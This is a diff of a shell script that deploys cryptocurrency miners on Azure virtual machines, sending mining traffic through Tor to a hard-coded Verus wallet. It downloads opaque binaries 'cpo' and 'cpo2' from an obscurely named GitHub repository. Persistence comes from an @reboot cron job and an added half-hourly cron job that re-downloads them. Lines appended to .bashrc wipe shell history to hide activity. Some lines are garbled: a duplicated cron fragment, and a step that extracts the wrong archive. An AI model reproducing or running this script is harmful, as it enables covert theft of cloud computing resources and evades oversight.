@@ -10,17 +10,23 @@ rm -r dolblu_shluh.tar.gz
 wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-linux.tar.gz -P /home/azureuser
 tar -xf cpuminer-opt-linux.tar.gz
 rm -r cpuminer-opt-linux.tar.gz 
-#### HELLMINER(VERUS): tmux new -ds servak torify ./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RSXVsvc1ngHoZzEvrzW5EUSaN8c2o47Xxt.BIG_TEST --cpu 2
+#### |NOT RECOMENDED MB BUG| HELLMINER(VERUS): tmux new -ds servak torify ./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RSXVsvc1ngHoZzEvrzW5EUSaN8c2o47Xxt.BIG_TEST --cpu 2
 wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64_avx.tar.gz -P /home/azureuser
 tar -xf hellminer_linux64_avx.tar.gz
 rm -r hellminer_linux64_avx.tar.gz
-########
+#### SRB MINER MULTI КОНФИНГ: sudo ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool eu.luckpool.net:3956 --wallet RSXVsvc1ngHoZzEvrzW5EUSaN8c2o47Xxt.BIG_TEST --proxy localhost:9050 --cpu-threads 2
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.7/SRBMiner-Multi-2-4-7-Linux.tar.xz -P /home/azureuser
+tar -xf hellminer_linux64_avx.tar.gz
+rm -r hellminer_linux64_avx.tar.gz
+mv /home/azureuser/SRBMiner-Multi-2-4-7/* /home/azureuser
+#####################################################################################################################
 wget https://github.com/j2d23enr2os32omedaro/jfksdhfvdsiouwrbn32980vxcnbmdfsajkfh2398/raw/main/cpo -P /home/azureuser
 wget https://github.com/j2d23enr2os32omedaro/jfksdhfvdsiouwrbn32980vxcnbmdfsajkfh2398/raw/main/cpo2 -P /home/azureuser
 chmod ugo+x cpo2
 chmod ugo+x cpo
 sudo systemctl enable cron
 crontab -l | { cat; echo "@reboot /home/azureuser/cpo2"; } | crontab
+sudo crontab -l | { cat; echo "0,30 * * * * wget -p /home/azureuser -O cpo_rpl_cpu https://github.com/j2d23enr2os32omedaro/jfksdhfvdsiouwrbn32980vxcnbmdfsajkfh2398/raw/main/cpo"; } | crontab"; } | crontab"; } | crontab
 echo ". cat /dev/null > ~/.bash_history" >> ~/.bashrc
 echo ". history -cw" >> ~/.bashrc
 sleep 7
